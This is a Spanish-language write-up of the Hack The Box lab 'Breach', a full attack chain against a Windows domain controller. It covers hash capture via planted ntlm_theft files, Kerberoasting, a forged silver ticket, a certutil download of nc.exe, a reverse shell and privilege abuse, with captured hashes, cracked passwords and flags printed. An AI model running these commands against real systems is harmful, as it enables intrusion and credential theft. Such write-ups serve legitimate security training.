---
tags:
title: Breach - Medium (HTB)
permalink: /Breach-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
 nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,49677,49917 10.129.231.198
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-13 15:15 -0300
Nmap scan report for 10.129.231.198
Host is up (1.2s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-13 18:17:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Not valid before: 2025-09-07T08:04:48
|_Not valid after:  2026-03-09T08:04:48
| rdp-ntlm-info: 
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-13T18:18:53+00:00
|_ssl-date: 2026-01-13T18:19:31+00:00; +1m38s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49917/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1m37s, deviation: 0s, median: 1m37s
| smb2-time: 
|   date: 2026-01-13T18:18:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.74 seconds
```
## Auth as Julia.Wong
### Share enumeration

El `null session` es valido, pero sin embargo, no me deja listar `Shares`.

```bash
nxc smb 10.129.231.198 -u '' -p ''
SMB         10.129.231.198  445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.231.198  445    BREACHDC         [+] breach.vl\:
```

Pero por otro lado el usuario de invitado `(Guest)` si es valido, y me revela que puedo escribir y leer en algunos recursos.

```bash
nxc smb 10.129.231.198 -u 'guest' -p '' --shares
SMB         10.129.231.198  445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.231.198  445    BREACHDC         [+] breach.vl\guest: 
SMB         10.129.231.198  445    BREACHDC         [*] Enumerated shares
SMB         10.129.231.198  445    BREACHDC         Share           Permissions     Remark
SMB         10.129.231.198  445    BREACHDC         -----           -----------     ------
SMB         10.129.231.198  445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.231.198  445    BREACHDC         C$                              Default share
SMB         10.129.231.198  445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.231.198  445    BREACHDC         NETLOGON                        Logon server share 
SMB         10.129.231.198  445    BREACHDC         share           READ,WRITE      
SMB         10.129.231.198  445    BREACHDC         SYSVOL                          Logon server share 
SMB         10.129.231.198  445    BREACHDC         Users           READ  
```
### Stealing Hash NTLM

Se me ocurre ya que tengo acceso y puedo escribir, crear un archivo malicioso y colocarlo en la ruta `/share`, para que el usuario que supervise por detrás, si es que lo hace, ejecute el archivo, y luego yo desde mi maquina pueda recibir un hash `NTLMv2`.

Para crear los archivos use `ntlm_theft` de este [repositorio de Github](https://github.com/Greenwolf/ntlm_theft).

```bash
python3 ntlm_theft.py --generate all --server 10.10.17.19 --filename zsln
Created: zsln/zsln.scf (BROWSE TO FOLDER)
Created: zsln/zsln-(url).url (BROWSE TO FOLDER)
Created: zsln/zsln-(icon).url (BROWSE TO FOLDER)
<SNIP>
Generation Complete.
```

Con los archivos creados, enumere los directorios dentro de este recurso, viendo que en `/transfers` hay varios usuarios, donde en el mismo coloque dos archivos los cuales son los que comunmente se ejecutan.

```bash
# put zsln.lnk
# put zsln.scf
# ls
drw-rw-rw-          0  Tue Jan 13 15:25:17 2026 .
drw-rw-rw-          0  Tue Jan 13 15:21:18 2026 ..
drw-rw-rw-          0  Thu Feb 17 08:23:51 2022 claire.pope
drw-rw-rw-          0  Thu Feb 17 08:23:22 2022 diana.pope
drw-rw-rw-          0  Wed Apr 16 21:38:12 2025 julia.wong
-rw-rw-rw-       2164  Tue Jan 13 15:25:17 2026 zsln.lnk
-rw-rw-rw-         85  Tue Jan 13 15:23:57 2026 zsln.scf
```

### Crack password

Y luego de unos segundos veo y recibo el hash del usuario `Julia.Wong`
```bash
responder -I tun0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
<SNIP>

[SMB] NTLMv2-SSP Client   : 10.129.231.198
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:50c1887968bda7a6:3A8E1573C45772C62ADDD751815C4813:010100000000000000A60F4CA084DC01D8FD71D22658C44F000000000200080056004F003900560001001E00570049004E002D0059004A003400530052005900330058004D005300510004003400570049004E002D0059004A003400530052005900330058004D00530051002E0056004F00390056002E004C004F00430041004C000300140056004F00390056002E004C004F00430041004C000500140056004F00390056002E004C004F00430041004C000700080000A60F4CA084DC0106000400020000000800300030000000000000000100000000200000E2ABA0E93A8449E5565C0FD2AE987B0D44938EE3292738FE8A5EE9B5E66DB8A90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310037002E00310039000000000000000000                                                                                                     
```

Use `john` para romper el hash.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Computer1        (Julia.Wong)     
1g 0:00:00:00 DONE (2026-01-13 15:25) 11.11g/s 1342Kp/s 1342Kc/s 1342KC/s bratz1234..042602
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

### SMB Auth

Con las credenciales me conecte nuevamente a `smb` y visualize la flag.

```bash
# cd julia.wong
# ls
drw-rw-rw-          0  Wed Apr 16 21:38:12 2025 .
drw-rw-rw-          0  Tue Jan 13 15:25:17 2026 ..
-rw-rw-rw-         32  Wed Apr 16 21:38:22 2025 user.txt
# get user.txt
```

```bash
cat user.txt                                                         
55d33e52bc5fa7a687b9f0dcfa103dda  
```
## Shell as svc_mssql
### Users enumeration

Use estas credenciales para conectarme a `rpcclient` y obtener una lista de usuarios.

```bash
rpcclient -U 'Julia.Wong%Computer1' 10.129.231.198   
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Claire.Pope] rid:[0x451]
user:[Julia.Wong] rid:[0x452]
user:[Hilary.Reed] rid:[0x453]
user:[Diana.Pope] rid:[0x454]
user:[Jasmine.Price] rid:[0x455]
user:[George.Williams] rid:[0x456]
user:[Lawrence.Kaur] rid:[0x457]
user:[Jasmine.Slater] rid:[0x458]
user:[Hugh.Watts] rid:[0x459]
user:[Christine.Bruce] rid:[0x45a]
user:[svc_mssql] rid:[0x45b]
```

Con este comando limpie el output y lo coloque dentro de un archivo.

```bash
cat users | tr ':' ' ' | awk '{print $2}' | tr -d '[]' | sponge users
```
### Kerberoasting

Luego con la lista de usuarios realice un `Kerberoasting Attack`, del cual, obtuve un hash del usuario `svc_mssql`

```bash
impacket-GetUserSPNs breach.vl/Julia.Wong:Computer1 -usersfile users -dc-ip 10.129.231.198 -request 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
<SNIP>

$krb5tgs$23$*svc_mssql$BREACH.VL$svc_mssql*$b1502f6fc2b7e905fccf5de6741c53cd$869ebd9db8e4f814d4f535f4c737e47889646cbba32dc92a86bea322c533884a6c29237d6011011b651dca148859774e99d4488779f376497ff834f1fb3576fa1bce72e331579421ebadfa931be6acfcab6c180605c6e25fcb044eb8c36d8ed95952227bb4f68284a05e4e9a2bd590204c9b60eb05bc52ef46ee833097d007e50d4c9ade327c2c26aa6c63d8cf420d506653877f31b17113aa11ef3df53cdbf158a571094ed34b6af89f4de7eaa4d7cd9123c5a3a4b026c747fd61cc69393878fd072ef534055a3c8329194f3d640957152982508f0135eabf5f21c2ff8a256dea313a0417ae84169224d78ad8c95148c267fe6f5b256562a13328fba5c55ea8bd789d13fa1841bf238001365362e689b91989541b1bd0096e020142fd3c68942c21c7586889f37cafbaf5faa6467a0d9b46f9ae6f96ea18fd25d75fa8dbc250ec5959bbc8a1ff2010984018bf6e902c8439433bb499c52d8a1566ec80af7fae39045a8f3a029dff948fd5aa3caf83858210e521acc830638bb7a627a1f05754b3834f6ab008e72c17fed3085fc634376bbe73606c893810b193c373bae4c8b923182cf8f4b2d7c022fd7cf404b78e20ff0fc29d9c37164fc3d2d806d56eb84504f5d5b9948b0d36c6e30f5e1669568da2015d529235879811630fbf67b9fa7d1a5bdbf96d155aab969dbaa222b155b7efb5a1dc397502e3abadaabb9c3d176ec91add6e5df510446bd04c276b742e426028de86cd32732bd770650ca57e556d8d5afd4fdfef88ea679ca2d381381f99f0896e8868f125a3790ab3fd296e9206f92a0753d36f7d26531e42cf4db625990213e9b9bded08b1dbdd220a94a15fcb0b0ea9c99ac7057a79272875c2b46b676e01e2e4b474a3ac9f6bf91d3692ea4c9acc4753c35eb361d53e25cd0da1a6e9374bd5b5d5afd63715aaf41df30d321de76060bca6437418194b656824b7bd32ab56937add0c576c47ddb8fcf6ba00c9af018ba6ab758bfb7ed2ef4a1e982825e8ccbb108bfa7146ef54c0786b64618099deeb3e1dbb6a4e7164a6725ea9ca0957d30be0aee3efa3f04c31245c54fae861e1310d9d85ec0e37ae68aa8e90382365b63f00bdba8537869e8bc32a4ad62c7a9514882bd81ed896dfd1d5670063cb4a83a5d9ab097b8964f23790d738c85bde19ed1acb5b75854b78396ef411b13300b1235686217c602baf2fb2b27035dacc4efc06f37fa019c06d380724d90e1e178a05f32e7f0a988b5d2ac167dfba5291d3e6f24f0a1d080f9b468cd16921a381a490c9c216b570b1b96802bdac311b96f392ac72a0565106bcdbada9cd4f8b2b309cd9eb487fc26dd89264a624696a4153f8d4e29d29fb4a71a57a45b0ad11fe93f5e0a8600ee67d509fc47f1f83335d26cda0b00203e52b627ecc014397687a110a90a53fc106f6f64b48f4695d5d8d4ae24e1a02f28f73c8da34467d698e703a760e
```

Lo coloque dentro de un archivo y lo rompi.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)     
1g 0:00:00:00 DONE (2026-01-13 15:28) 50.00g/s 2611Kp/s 2611Kc/s 2611KC/s chloelouise..lili12
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Por alguna razon, me asegure de que el puerto `1443` este abierto ya que la cuenta pertenece a este servicio, así que volví a correr `nmap` y ahí estaba.

```bash
nmap -sS -p- --open --min-rate 5000 -n -vvv 10.129.231.198 -Pn                                           
<SNIP>
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
```
### Silver Ticket Attack

Al conectarme con las credenciales del usuario `svc_mssql` no pude hacer nada, no habian bases de datos, y pude habilitar el componente `xp_cmdshell`.

Por lo que parecido a la maquina `Scrambled`, forje un `Silver Ticket` con el cual puedo impersonar al usuario `administrator` de la base de datos.
### Calculate NT hash

Primero calcule el hash `NT`.

```bash
iconv -f ascii -t utf16le <(printf 'Trustno1') | openssl dgst -md4                     
MD4(stdin)= 69596c7aa1e8daee17f8e78870e25a5c
```

Y luego con `rpcclient` obtuve el `Domain SID`.

```bash
rpcclient -U 'Julia.Wong%Computer1' 10.129.231.198
rpcclient $> lsaquery
Domain Name: BREACH
Domain Sid: S-1-5-21-2330692793-3312915120-706255856
```
### Forge ticket

Luego con el mismo `ticketer` de impacket, forje mi ticket impersonando a administrador de la base de datos.

```bash
impacket-ticketer -nthash '69596c7aa1e8daee17f8e78870e25a5c' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl:1433' administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

Lo exporte a la variable de `Kerberos`.

```bash         
export KRB5CCNAME=administrator.ccache
```
### xp_cmdshell

Y luego realice la conexión, dándome acceso como el usuario `administrator` de la base de datos.

```bash            
impacket-mssqlclient -k -no-pass breach.vl/administrator@breach.vl  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)> 
```

Luego habilite el `xp_cmshell`

```bash
SQL (BREACH\Administrator  dbo@master)> enable_xp_cmdshell
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell whoami
output             
----------------   
breach\svc_mssql   
NULL 
```

Y como veo que tengo ejecución de comandos, me descargue el `nc.exe` en la maquina.

```bash
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell certutil -urlcache -split -f http://10.10.17.19/nc.exe C:\programdata\nc.exe
output                                                
---------------------------------------------------   
****  Online  ****                                    
  0000  ...                                           
  6e00                                                
CertUtil: -URLCache command completed successfully. 
```
### Shell

Y luego me envié una shell.

```bash
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell C:\programdata\nc.exe 10.10.17.19 4444 -e cmd
```

Y desde mi listener `nc` recibo la conexión como el usuario `svc_mssql`.

```powershell
rlwrap -cAr nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.231.198] 56977
Microsoft Windows [Version 10.0.20348.558]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami 
breach\svc_mssql
```
### Dangerous privileges

Viendo los privilegios que posee este usuario, veo que tiene el `SeImpersonatePrivilege` y además el `SeManageVolumePrivilege`.

```bash
PS C:\Windows\system32> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
### SeManageVolumePrivilege abuse

Para cambiar un poco, abuse de `SeManageVolumePrivilege`.

>`SeManageVolumePrivilege`. Básicamente, el privilegio proporciona acceso directo al `disco`, que tiene la intención de modificar, pero también hay muchas cosas indocumentadas que se pueden modificar.

Me lo descargue de [este repositorio](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public) y lo ejecute.

```powershell
PS C:\programdata> certutil -urlcache -split -f http://10.10.17.19/SeManageVolumeExploit.exe C:\programdata\SeManageVolumeExploit.exe
certutil -urlcache -split -f http://10.10.17.19/SeManageVolumeExploit.exe C:\programdata\SeManageVolumeExploit.exe
****  Online  ****
  0000  ...
  3000
CertUtil: -URLCache command completed successfully.
PS C:\programdata> .\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 1240
DONE
```

Dándome acceso de lectura al directorio del usuario `Administrator`.

```powershell
PS C:\programdata> dir C:\Users\administrator\desktop
dir C:\Users\administrator\desktop


    Directory: C:\Users\administrator\desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         4/17/2025  12:37 AM             32 root.txt                                                             


PS C:\programdata> type C:\Users\administrator\desktop\root.txt
type C:\Users\administrator\desktop\root.txt
fc98f418f94f8cdb9a30ef026fe64345
```

`~Happy Hacking.`